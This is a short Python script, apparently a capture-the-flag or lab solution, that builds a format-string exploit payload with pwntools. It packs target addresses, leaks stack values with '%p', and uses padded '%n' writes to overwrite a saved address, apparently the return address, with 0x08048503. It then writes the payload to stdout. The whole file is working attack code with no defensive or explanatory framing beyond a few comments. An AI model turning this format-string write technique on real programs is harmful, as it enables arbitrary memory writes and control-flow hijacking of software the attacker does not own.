import sys
from pwn import p64, p32

# payload = p64(0x7fffffffd628) + b"%p"*11 + b"%n"
# payload = b"\x28\xd6\xff\xff\xff\x7f" + b"%p"*11 + b"%n"

addr = 0xffffc6cc
a1 = p32(addr)
a2 = p32(addr+1)
a3 = p32(addr+2)
a4 = p32(addr+3)

ret = "0x08048503"
payload = a1 + a2 + a3 + a4
payload += b"%p"*11

# payload += b"%n"
# got 54 as desired

payload += b"A"*(0x103-0x54)
payload += b"%n"

payload += b"A"*(0x185-0x103)
payload += b"%n"

payload += b"A"*(0x204-0x185)
payload += b"%n"

payload += b"A"*(0x208-0x204)
payload += b"%n"

sys.stdout.buffer.write(payload)

# with open("payload", "wb") as f:
#     f.write(payload)
